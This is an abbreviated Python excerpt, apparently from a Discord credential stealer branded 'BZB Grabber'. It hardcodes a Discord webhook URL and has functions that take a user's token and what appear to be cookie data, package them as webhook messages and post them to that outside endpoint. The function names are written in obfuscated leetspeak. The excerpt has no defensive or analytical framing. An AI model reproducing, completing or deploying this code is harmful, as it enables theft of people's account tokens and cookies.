...
wh00k = "https://discordapp.com/api/webhooks/1088505322429218878/Wp39IOMJqr4kSMac84O5s14c-39TsZ0J-e7e5DcHB6Nt-s7y8InUWN_8v4obrZ6h7UTX"
...
def upl05dT4k31(t0k3n, path):
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "BZB Grabber",
                "icon_url": "https://cdn.discordapp.com/attachments/1099726574359674930/1101171051725066340/Sans_titre.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
...
def upload(name, link):
    ...
    if name == "crcook":
        ...
        data = {
            ...
            "username": "BZB Grabber",
            "avatar_url": "https://cdn.discordapp.com/attachments/1099726574359674930/1101171051725066340/Sans_titre.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return
